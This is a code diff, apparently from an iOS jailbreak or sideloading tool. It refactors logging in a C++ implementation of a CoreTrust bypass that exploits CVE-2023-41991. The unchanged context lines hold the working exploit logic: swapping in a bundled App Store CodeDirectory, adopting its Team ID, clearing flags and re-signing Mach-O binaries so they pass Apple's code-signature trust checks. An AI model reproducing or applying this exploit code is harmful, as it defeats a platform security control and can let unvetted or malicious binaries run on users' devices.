@@ -10,7 +10,6 @@
 #include <mach-o/loader.h>
 
 #include <algorithm>
-#include <cstdio>
 #include <memory>
 #include <optional>
 #include <string>
@@ -18,6 +17,7 @@
 
 #include "cf_ptr.h"
 #include "coretrust_bypass_internal.h"
+#include "log.h"
 #include "macho/cs_blob.h"
 #include "macho/macho.h"
 #include "template/template.h"
@@ -48,7 +48,7 @@ constexpr char kCdHashesPlistOid[] = "1.2.840.113635.100.9.1";  // XML plist
 constexpr char kCdHashesDerOid[] = "1.2.840.113635.100.9.2";    // DER
 
 void log_openssl_error(const char* what) {
-  fprintf(stderr, "%s: %s\n", what, ERR_error_string(ERR_get_error(), nullptr));
+  log::error("%s: %s", what, ERR_error_string(ERR_get_error(), nullptr));
 }
 
 // Parses Apple's CMS out of the template signature blob. It already holds
@@ -58,7 +58,7 @@ CMSPtr load_cms_template() {
   const uint8_t* der = blob.data + kBlobHeaderSize;
   long der_size = static_cast<long>(blob.size - kBlobHeaderSize);
   CMSPtr cms(d2i_CMS_ContentInfo(nullptr, &der, der_size));
-  if (!cms) log_openssl_error("Failed to parse CMS blob");
+  if (!cms) log_openssl_error("failed to parse CMS blob");
   return cms;
 }
 
@@ -74,7 +74,7 @@ ReturnCode load_ca_identity(EVPKeyPtr& private_key, X509Ptr& certificate) {
         PEM_read_bio_PrivateKey(key_pem.get(), nullptr, nullptr, nullptr));
   }
   if (!private_key) {
-    log_openssl_error("Failed to read CA private key");
+    log_openssl_error("failed to read CA private key");
     return ReturnCode::kErrCommon;
   }
 
@@ -84,7 +84,7 @@ ReturnCode load_ca_identity(EVPKeyPtr& private_key, X509Ptr& certificate) {
         PEM_read_bio_X509(cert_pem.get(), nullptr, nullptr, nullptr));
   }
   if (!certificate) {
-    log_openssl_error("Failed to read CA certificate");
+    log_openssl_error("failed to read CA certificate");
     return ReturnCode::kErrCommon;
   }
   return ReturnCode::kOk;
@@ -105,7 +105,7 @@ CFPtr<CFDataRef> create_cdhashes_plist(const Bytes& sha1_cdhash,
       kCFAllocatorDefault, 1, &kCFTypeDictionaryKeyCallBacks,
       &kCFTypeDictionaryValueCallBacks));
   if (!sha1_data || !sha256_data || !cdhashes || !dictionary) {
-    fprintf(stderr, "Failed to create CDHashes plist objects\n");
+    log::error("failed to create CDHashes plist objects");
     return nullptr;
   }
   CFArrayAppendValue(cdhashes.get(), sha1_data.get());
@@ -118,8 +118,8 @@ CFPtr<CFDataRef> create_cdhashes_plist(const Bytes& sha1_cdhash,
                                kCFPropertyListXMLFormat_v1_0, 0, &error_raw));
   CFPtr<CFErrorRef> error(error_raw);
   if (!plist) {
-    fprintf(stderr, "Failed to encode CDHashes plist: %s\n",
-            utils::cf_description(error.get()).c_str());
+    log::error("failed to encode CDHashes plist: %s",
+               utils::cf_description(error.get()).c_str());
     return nullptr;
   }
   return plist;
@@ -137,7 +137,7 @@ ReturnCode add_cdhashes_attributes(CMS_SignerInfo* signer,
           signer, kCdHashesPlistOid, V_ASN1_OCTET_STRING,
           CFDataGetBytePtr(plist.get()),
           static_cast<int>(CFDataGetLength(plist.get())))) {
-    log_openssl_error("Failed to add plist CDHashes attribute");
+    log_openssl_error("failed to add plist CDHashes attribute");
     return ReturnCode::kErrAddSignature;
   }
 
@@ -151,7 +151,7 @@ ReturnCode add_cdhashes_attributes(CMS_SignerInfo* signer,
 
   if (!CMS_signed_add1_attr_by_txt(signer, kCdHashesDerOid, V_ASN1_SEQUENCE,
                                    der.data(), static_cast<int>(der.size()))) {
-    log_openssl_error("Failed to add DER CDHashes attribute");
+    log_openssl_error("failed to add DER CDHashes attribute");
     return ReturnCode::kErrAddSignature;
   }
   return ReturnCode::kOk;
@@ -162,7 +162,7 @@ ReturnCode encode_signature_blob(CMS_ContentInfo* cms, Blob& signature_blob) {
   unsigned char* cms_data = nullptr;
   int cms_data_size = i2d_CMS_ContentInfo(cms, &cms_data);
   if (cms_data_size <= 0) {
-    log_openssl_error("Failed to encode CMS structure");
+    log_openssl_error("failed to encode CMS structure");
     return ReturnCode::kErrCommon;
   }
 
@@ -201,7 +201,7 @@ ReturnCode update_signature_blob(SuperBlob& superblob) {
       cms.get(), certificate.get(), private_key.get(), EVP_sha256(),
       CMS_PARTIAL | CMS_REUSE_DIGEST | CMS_NOSMIMECAP);
   if (!new_signer) {
-    log_openssl_error("Failed to add signer");
+    log_openssl_error("failed to add signer");
     return ReturnCode::kErrAddSignature;
   }
 
@@ -209,7 +209,7 @@ ReturnCode update_signature_blob(SuperBlob& superblob) {
   if (failed(rc)) return rc;
 
   if (!CMS_SignerInfo_sign(new_signer)) {
-    log_openssl_error("Failed to sign CMS structure");
+    log_openssl_error("failed to sign CMS structure");
     return ReturnCode::kErrAddSignature;
   }
 
@@ -227,7 +227,7 @@ void warn_if_no_entitlements(const SuperBlob& superblob, uint32_t filetype) {
       superblob.find_blob(SlotType::kEntitlements).has_value() ||
       superblob.find_blob(SlotType::kDerEntitlements).has_value();
   if (!has_entitlements && filetype == MH_EXECUTE) {
-    fprintf(stderr, "Warning: no entitlements found in the code signature\n");
+    log::warn("no entitlements found in the code signature");
   }
 }
 
@@ -276,13 +276,13 @@ ReturnCode compute_cdhashes(const SuperBlob& superblob, Bytes& sha1_cdhash,
                             Bytes& sha256_cdhash) {
   std::optional<Blob> sha1_cd = superblob.find_blob(SlotType::kCodeDirectory);
   if (!sha1_cd) {
-    fprintf(stderr, "Could not find SHA1 CodeDirectory blob\n");
+    log::error("could not find SHA1 CodeDirectory blob");
     return ReturnCode::kErrCodeDirMissing;
   }
   std::optional<Blob> sha256_cd =
       superblob.find_blob(SlotType::kAlternateCodeDirectories);
   if (!sha256_cd) {
-    fprintf(stderr, "Could not find SHA256 CodeDirectory blob\n");
+    log::error("could not find SHA256 CodeDirectory blob");
     return ReturnCode::kErrCodeDirMissing;
   }
 
@@ -291,7 +291,7 @@ ReturnCode compute_cdhashes(const SuperBlob& superblob, Bytes& sha1_cdhash,
   std::optional<Bytes> sha256 = compute_digest(
       HashType::kSha256, sha256_cd->data.data(), sha256_cd->data.size());
   if (!sha1 || !sha256) {
-    fprintf(stderr, "Failed to hash CodeDirectories\n");
+    log::error("failed to hash CodeDirectories");
     return ReturnCode::kErrCommon;
   }
   sha1_cdhash = std::move(*sha1);
@@ -303,35 +303,37 @@ ReturnCode select_slice(MachO::Ptr& macho) {
   if (macho->is_thin_64()) {
     return ReturnCode::kOk;
   }
+  log::substep("Select the arm64 slice of the universal binary");
   std::optional<MachOSlice> slice = pick_slice(*macho);
   MachO::Ptr thin;
   if (!slice.has_value() || failed(macho->extract_slice(*slice, thin)) ||
       !thin->is_thin_64()) {
-    fprintf(stderr, "Error: no arm64 slice to re-sign in this binary\n");
+    log::error("no arm64 slice to re-sign in this binary");
     return ReturnCode::kErrMachoNoUsableSlice;
   }
-  printf("Using the slice at offset 0x%llx (cputype 0x%x, cpusubtype 0x%x)\n",
-         static_cast<unsigned long long>(slice->offset),
-         static_cast<unsigned>(slice->cputype),
-         static_cast<unsigned>(slice->cpusubtype));
+  log::info("Using the slice at offset 0x%llx (cputype 0x%x, cpusubtype 0x%x)",
+            static_cast<unsigned long long>(slice->offset),
+            static_cast<unsigned>(slice->cputype),
+            static_cast<unsigned>(slice->cpusubtype));
   macho = std::move(thin);
   return ReturnCode::kOk;
 }
 
 ReturnCode check_supported_macho(const MachO& macho) {
+  log::substep("Check the binary is supported");
   if (!macho.is_thin_64()) {
-    fprintf(stderr, "Error: a thin 64-bit Mach-O is required\n");
+    log::error("a thin 64-bit Mach-O is required");
     return ReturnCode::kErrMachoNoUsableSlice;
   }
   if (macho.encrypted()) {
-    fprintf(stderr, "Error: MachO is encrypted, please use a decrypted app\n");
+    log::error("MachO is encrypted, please use a decrypted app");
     return ReturnCode::kErrMachoEncrypted;
   }
   std::optional<uint32_t> filetype = macho.filetype();
   if (filetype == MH_OBJECT || filetype == MH_DSYM) {
-    fprintf(stderr,
-            "Error: MachO is an object or dSYM file, please use an executable "
-            "or dynamic library\n");
+    log::error(
+        "MachO is an object or dSYM file, please use an executable or "
+        "dynamic library");
     return ReturnCode::kErrMachoFiletype;
   }
   return ReturnCode::kOk;
@@ -339,22 +341,27 @@ ReturnCode check_supported_macho(const MachO& macho) {
 
 ReturnCode load_code_signature(const MachO& macho, SuperBlob& superblob,
                                size_t& code_signature_offset) {
+  log::substep("Locate the code signature");
   size_t code_signature_size = 0;
   if (failed(macho.get_signature_range(code_signature_offset,
                                        code_signature_size))) {
-    fprintf(stderr,
-            "Error: no code signature found; fake-sign the binary at minimum "
-            "before running the bypass\n");
+    log::error(
+        "no code signature found; fake-sign the binary at minimum before "
+        "running the bypass");
     return ReturnCode::kErrNoCodeSignature;
   }
 
+  log::info("Found %zu bytes at offset 0x%zx", code_signature_size,
+            code_signature_offset);
+
+  log::substep("Decode the SuperBlob");
   const Bytes& file = macho.data();
   Bytes code_signature_data(file.begin() + code_signature_offset,
                             file.begin() + code_signature_offset +
                                 code_signature_size);
   std::optional<SuperBlob> decoded = SuperBlob::deserialize(code_signature_data);
   if (!decoded.has_value()) {
-    fprintf(stderr, "Error: failed to decode the existing code signature\n");
+    log::error("failed to decode the existing code signature");
     return ReturnCode::kErrDecodeSuperBlob;
   }
   superblob = std::move(decoded.value());
@@ -370,13 +377,14 @@ ReturnCode load_code_signature(const MachO& macho, SuperBlob& superblob,
 // Reports the App Store CodeDirectory's Team ID in `app_store_team_id`
 ReturnCode swap_in_app_store_cd(SuperBlob& superblob,
                                 std::string& app_store_team_id) {
+  log::substep("Validate the real CodeDirectory");
   std::optional<Blob> main_cd = superblob.find_blob(SlotType::kCodeDirectory);
   std::optional<Blob> alt_cd =
       superblob.find_blob(SlotType::kAlternateCodeDirectories);
   if (!main_cd.has_value()) {
-    fprintf(stderr,
-            "Error: unable to find code directory, make sure the input binary "
-            "is ad-hoc signed\n");
+    log::error(
+        "unable to find code directory, make sure the input binary is ad-hoc "
+        "signed");
     return ReturnCode::kErrCodeDirMissing;
   }
 
@@ -387,16 +395,15 @@ ReturnCode swap_in_app_store_cd(SuperBlob& superblob,
   std::optional<CodeDirectory> real_cd =
       CodeDirectory::deserialize(real_cd_blob.data);
   if (!real_cd.has_value()) {
-    fprintf(stderr, "Error: code directory is malformed\n");
+    log::error("code directory is malformed");
     return ReturnCode::kErrCodeDirMalformed;
   }
   if (real_cd->hash_type() != HashType::kSha256) {
-    fprintf(stderr, "Error: code directory is not SHA256, bypass won't work\n");
+    log::error("code directory is not SHA256, bypass won't work");
     return ReturnCode::kErrCodeDirNotSha256;
   }
 
-  printf("Applying App Store code directory...\n");
-
+  log::substep("Move the real CodeDirectory to slot 0x1000");
   // Clear both CodeDirectory slots, then re-add the real one as the alternate
   // (SHA256) CodeDirectory at slot 0x1000. The alternate slot may be absent, so
   // that removal is allowed to fail
@@ -411,24 +418,25 @@ ReturnCode swap_in_app_store_cd(SuperBlob& superblob,
 
   // Insert the App Store CodeDirectory (SHA1) into the now-empty slot 0 and
   // adopt its Team ID; both CodeDirectories must end up with the same Team ID
+  log::substep("Insert the App Store CodeDirectory into slot 0");
   Blob app_store_cd_blob = Blob::blob_from_generic(
       SlotType::kCodeDirectory, templates::app_store_code_directory().data);
   std::optional<CodeDirectory> app_store_cd =
       CodeDirectory::deserialize(app_store_cd_blob.data);
   if (!app_store_cd.has_value()) {
-    fprintf(stderr, "Error: bundled App Store code directory is malformed\n");
+    log::error("bundled App Store code directory is malformed");
     return ReturnCode::kErrCodeDirMalformed;
   }
   app_store_team_id = app_store_cd->team_id();
   if (app_store_team_id.empty()) {
-    fprintf(stderr, "Error: unable to determine App Store Team ID\n");
+    log::error("unable to determine App Store Team ID");
     return ReturnCode::kErrSetTeamId;
   }
   if (failed(superblob.add_blob(app_store_cd_blob))) {
     return ReturnCode::kErrCommon;
   }
 
-  printf("Adding new signature blob...\n");
+  log::substep("Remove the old signature blob");
   // Remove the existing signature blob if present (absent slot is not an error)
   superblob.remove_blob(SlotType::kSignature);
   return ReturnCode::kOk;
@@ -438,20 +446,20 @@ ReturnCode swap_in_app_store_cd(SuperBlob& superblob,
 // both code directories need the same one) and clears its flags
 ReturnCode adopt_app_store_team_id(SuperBlob& superblob,
                                    const std::string& app_store_team_id) {
-  printf("Updating TeamID...\n");
+  log::substep("Adopt the App Store Team ID and clear the flags");
   std::optional<CodeDirectory> real_cd;
   ReturnCode rc = load_real_cd(superblob, real_cd);
   if (failed(rc)) return rc;
 
   if (failed(real_cd->set_team_id(app_store_team_id))) {
-    fprintf(stderr, "Error: failed to set Team ID\n");
+    log::error("failed to set Team ID");
     return ReturnCode::kErrSetTeamId;
   }
   // Clear every flag (notably the adhoc flag in bit 1) so the two code
   // directories match
   real_cd->set_flags(0);
   if (failed(rc = store_real_cd(superblob, *real_cd))) return rc;
-  printf("TeamID set to %s!\n", app_store_team_id.c_str());
+  log::info("Team ID set to %s", app_store_team_id.c_str());
   return ReturnCode::kOk;
 }
 
@@ -463,50 +471,50 @@ ReturnCode adopt_app_store_team_id(SuperBlob& superblob,
 ReturnCode sign_superblob(MachO& macho, SuperBlob& superblob,
                           size_t code_signature_offset,
                           Bytes& signed_superblob) {
-  printf("Doing initial signing to calculate size...\n");
+  log::substep("Initial signing to calculate the size");
   ReturnCode rc = update_signature_blob(superblob);
   if (failed(rc)) {
-    fprintf(stderr, "Error: failed to create new signature blob\n");
+    log::error("failed to create new signature blob");
     return rc;
   }
 
-  printf("Encoding unsigned superblob...\n");
+  log::substep("Encode the unsigned SuperBlob");
   Bytes unsigned_superblob = superblob.serialize();
 
-  printf("Updating load commands...\n");
+  log::substep("Update the load commands");
   if (failed(rc = macho.resize_code_signature(unsigned_superblob.size()))) {
-    fprintf(stderr, "Error: failed to update load commands\n");
+    log::error("failed to update load commands");
     return rc;
   }
 
   // The page hashes cover everything before the signature, which now includes
   // the updated load commands
-  printf("Updating code slot hashes...\n");
+  log::substep("Update the code slot hashes");
   std::optional<CodeDirectory> real_cd;
   if (failed(rc = load_real_cd(superblob, real_cd))) return rc;
   if (failed(real_cd->update_code_slots(macho.data().data(),
                                         code_signature_offset))) {
-    fprintf(stderr, "Error: failed to update code slot hashes\n");
+    log::error("failed to update code slot hashes");
     return ReturnCode::kErrUpdateCodeSlots;
   }
   // Store it before re-signing, otherwise the final cdhash covers the stale
   // hashes
   if (failed(rc = store_real_cd(superblob, *real_cd))) return rc;
 
-  printf("Signing binary...\n");
+  log::substep("Final signing");
   if (failed(rc = update_signature_blob(superblob))) {
-    fprintf(stderr, "Error: failed to create new signature blob\n");
+    log::error("failed to create new signature blob");
     return rc;
   }
 
-  printf("Encoding signed superblob...\n");
+  log::substep("Encode the signed SuperBlob");
   signed_superblob = superblob.serialize();
 
   // The load commands were sized from the first pass, so the signed superblob
   // has to come out exactly as large
   if (signed_superblob.size() != unsigned_superblob.size()) {
-    fprintf(stderr, "Error: signed superblob size changed (%zu -> %zu bytes)\n",
-            unsigned_superblob.size(), signed_superblob.size());
+    log::error("signed superblob size changed (%zu -> %zu bytes)",
+               unsigned_superblob.size(), signed_superblob.size());
     return ReturnCode::kErrSuperBlobSizeMismatch;
   }
   return ReturnCode::kOk;
@@ -529,11 +537,12 @@ ReturnCode CoreTrustBypassImpl::bypass() const {
   using macho::MachO;
   using macho::SuperBlob;
 
-  printf("Loading MachO...\n");
+  log::step("Load the Mach-O");
+  log::substep("Parse %s", path_.c_str());
   MachO::Ptr macho;
   ReturnCode rc = MachO::load(path_, macho);
   if (failed(rc)) {
-    fprintf(stderr, "Error: failed to parse MachO\n");
+    log::error("failed to parse MachO");
     return rc;
   }
 
@@ -544,7 +553,7 @@ ReturnCode CoreTrustBypassImpl::bypass() const {
     return rc;
   }
 
-  printf("Decoding code signature...\n");
+  log::step("Read the code signature");
   SuperBlob superblob;
   size_t code_signature_offset = 0;
   if (failed(rc = detail::load_code_signature(*macho, superblob,
@@ -553,6 +562,7 @@ ReturnCode CoreTrustBypassImpl::bypass() const {
   }
   warn_if_no_entitlements(superblob, macho->filetype().value_or(0));
 
+  log::step("Swap in the App Store CodeDirectory");
   std::string app_store_team_id;
   if (failed(rc = detail::swap_in_app_store_cd(superblob, app_store_team_id)) ||
       failed(rc = detail::adopt_app_store_team_id(superblob,
@@ -560,6 +570,7 @@ ReturnCode CoreTrustBypassImpl::bypass() const {
     return rc;
   }
 
+  log::step("Sign the code signature (CVE-2023-41991)");
   Bytes new_superblob;
   if (failed(rc = detail::sign_superblob(*macho, superblob,
                                          code_signature_offset,
@@ -567,16 +578,19 @@ ReturnCode CoreTrustBypassImpl::bypass() const {
     return rc;
   }
 
-  printf("Writing superblob to MachO...\n");
+  log::step("Write the Mach-O");
+  log::substep("Write the SuperBlob into the binary");
   // The reserved range also covers the padding that followed the old
   // SuperBlob, so the new one fills its start and the rest is zeroed
-  if (failed(rc = macho->update_code_signature(new_superblob)) ||
-      failed(rc = macho->save(path_))) {
-    fprintf(stderr, "Error: failed to write MachO\n");
+  if (failed(rc = macho->update_code_signature(new_superblob))) {
+    log::error("failed to write the code signature");
     return rc;
   }
-
-  printf("Successfully applied CoreTrust bypass to %s\n", path_.c_str());
+  log::substep("Save %s", path_.c_str());
+  if (failed(rc = macho->save(path_))) {
+    log::error("failed to write MachO");
+    return rc;
+  }
   return ReturnCode::kOk;
 }
 
